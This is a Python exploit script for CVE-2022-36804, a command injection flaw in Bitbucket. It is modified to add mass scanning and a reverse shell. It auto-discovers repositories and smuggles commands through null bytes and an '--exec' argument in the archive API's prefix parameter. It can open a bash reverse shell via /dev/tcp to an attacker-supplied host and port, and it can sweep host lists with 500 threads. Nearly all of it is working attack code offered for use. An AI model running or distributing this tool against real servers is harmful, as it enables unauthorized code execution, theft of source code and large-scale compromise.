"""
CVE: 2022-36804
Description: Critical Unauthenticated Command Injection in Bitbucket Instances
Author: BenHays142 (Modified By Chocapikk [Mass Exploit +  Reverse shell options])
"""
import sys
import json
import requests
import argparse
import urllib.parse
import concurrent.futures
from rich.console import Console
from requests.packages import urllib3

urllib3.disable_warnings()
console = Console()


parser = argparse.ArgumentParser(
    description="Exploit BitBucket Instances (< v8.3.1) using CVE-2022-36804. Exploits automagically without any extra parameters, but allows for custom settings as well."
)


parser.add_argument(
    "--server", action="store", dest="server", help="Host to attack", required=False
)
parser.add_argument(
    "--project",
    type=str,
    action="store",
    dest="project",
    help="The name of the project the repository resides in",
    required=False,
)
parser.add_argument(
    "--repo",
    type=str,
    action="store",
    dest="repo",
    help="The name of the repository",
    required=False,
)
parser.add_argument(
    "--skip-auto",
    action="store_true",
    dest="skip_auto",
    help="Skip the automatic finding of exploitable repos",
    required=False,
)
parser.add_argument(
    "--session",
    type=str,
    action="store",
    dest="session",
    help="Value of 'BITBUCKETSESSIONID' cookie, useful if target repo is private ",
)
parser.add_argument(
    "--command",
    type=str,
    action="store",
    dest="cmd",
    default="whoami",
    help="Command to execute if exploit is successful (Note: getting output isn't reliable so OOB exfil is a must)",
)
parser.add_argument("--file", type=str, dest="file", help="File to scan bulk hosts")
parser.add_argument(
    "--output", type=str, dest="output", help="Output file for the session"
)
parser.add_argument(
    "--lhost", type=str, dest="lhost", help="Your Local Host for reverse shell"
)
parser.add_argument(
    "--lport", type=str, dest="lport", help="Your Local Port for reverse shell"
)
parser.add_argument(
    "--threads",
    type=int,
    dest="threads",
    default=500,
    help="Threads for mass exploitation",
)


args = parser.parse_args(None if sys.argv[1:] else ["-h"])


def detect_repo(server, silent=False):
    console.print(f"[bold blue][*] Checking for open repos...") if not silent else None
    query = s.get(server + "/rest/api/latest/repos", verify=False, timeout=10).text
    query_json = json.loads(query)

    if query_json["size"] < 1:
        console.print(
            f"[bold red][-] Could not automatically find any suitable repos, perhaps try again with a valid session cookie"
        ) if not silent else None
        exit()
    else:
        console.print(
            f"[bold green][+] Found {query_json['size']} suitable repo(s)..."
        ) if not silent else None

    # Pick first found repo (Maybe Fix later)
    console.print(
        f"[bold green][+] Using \"{query_json['values'][0]['slug']}\" Repo inside \"{query_json['values'][0]['project']['name']}\" project..."
    ) if not silent else None

    # Note: We have to use the project's key for exploitation to succeed
    return query_json["values"][0]["slug"], query_json["values"][0]["project"]["key"]


def exec_stuff(server, project, repo, cmd, silent=False):
    cmd = urllib.parse.quote(cmd)
    console.print("[bold blue][*] Running command...") if not silent else None
    try:
        test = s.get(
            server
            + f"/rest/api/latest/projects/{project}/repos/{repo}/archive?filename=kiE0H&at=kiE0H&path=kiE0h&prefix=ax%00--exec=%60{cmd}%60%00--remote=origin",
            verify=False,
            timeout=10,
        )
        query = test.text
    except requests.exceptions.ReadTimeout:
        if args.lhost and args.lport:
            console.print("[bold green][*] Enjoy Your Reverse Shell")
            sys.exit(0)

    if "An error occurred while executing an external process" in query:
        console.print(
            f"[bold red][-] Target does not appear to be vulnerable or some info is wrong"
        ) if not silent else None
    elif "com.atlassian.bitbucket.scm.CommandFailedException" in query:
        console.print(
            f"[bold green][+] The command has been executed (Note: getting output isn't reliable so OOB exfil using something like DNS or Interactsh is a must)"
        ) if not silent else None
        console.print(
            f"[bold green][+] Response received from API: {json.loads(query)['errors'][0]['message']}"
        ) if not silent else None
        return {json.loads(query)["errors"][0]["message"]}

    elif "You are not permitted to access this resource" in query:
        console.print(
            "[bold red][-] You don't have access to this resource, if this is a private repo, you can try again using a session cookie"
        ) if not silent else None


def check_vuln(server, project, repo, silent=False):
    console.print(
        "[bold blue][*] Checking if site is vulnerable..."
    ) if not silent else None
    query = s.get(
        server
        + f"/rest/api/latest/projects/{project}/repos/{repo}/archive?format=zip&path=aaa&prefix=test/%00test",
        verify=False,
        timeout=10,
    ).text

    # Check results
    if "An error occurred while executing an external process" in query:
        return False
    elif "is not a valid ref and may not be archived" in query:
        return query
    elif "You are not permitted to access this resource" in query:
        console.print(
            "[bold red][-] You don't have access to this resource, if this is a private repo, you can try again using a session cookie"
        ) if not silent else None
        return False
    else:
        console.print(
            "[bold red][-] Something weird happened, double check your parameters; Or perhaps the instance just isn't vulnerable"
        ) if not silent else None
        return False


def mass_exploit(host):
    if not "://" in host:
        host = "https://" + host
    args.repo, args.project = detect_repo(host, silent=True)
    if check_vuln(host, args.project, args.repo, silent=True):
        output = f"{host}"
        console.print(f"[bold green][+] Target is vulnerable!!! {host}")
        mass_result.append(f"{host}")


def main():

    global mass_result
    mass_result = list()

    # Initialize requests session and populate it with important data.
    global s
    s = requests.session()
    s.verify = False
    s.headers.update(
        {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
    )
    if args.session:
        s.cookies.update({"BITBUCKETSESSIONID": args.session})

    if not args.file:
        # Handle some edge-cases with argparsing
        if not (
            args.server.startswith("https://") or args.server.startswith("http://")
        ):
            args.server = "http://" + args.server
            console.print(args.server)
        if args.project and args.repo and not args.skip_auto:
            args.skip_auto = True
        elif args.project or args.repo:
            console.print(
                f"[bold red][-] ERROR: You must provide both --project and --repo if you want to use either."
            )
            exit()

        if not args.skip_auto:
            args.repo, args.project = detect_repo(args.server)

        else:
            console.print(
                f'[bold green][+] Using "{args.repo}" Repo inside "{args.project}" project...'
            )

        if check_vuln(args.server, args.project, args.repo):
            console.print(f"[bold green][+] Target is vulnerable!!!")
            if args.lhost and args.lport:
                console.print(
                    f"[bold green][+] Trying the reverse shell payload (Check your netcat listener)"
                )
                args.cmd = f"bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1"

            exec_stuff(args.server, args.project, args.repo, args.cmd)

        else:
            console.print(
                f"[bold red][-] Target is not vulnerable or some info is wrong"
            )
    else:

        with open(args.file, "r") as targets:
            hosts = targets.readlines()

        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as pool:
            pool.map(mass_exploit, hosts)

        if args.output:
            with open(args.output, "w") as f:
                for hosts in mass_result:
                    if hosts:
                        f.write(hosts)


if __name__ == "__main__":
    main()
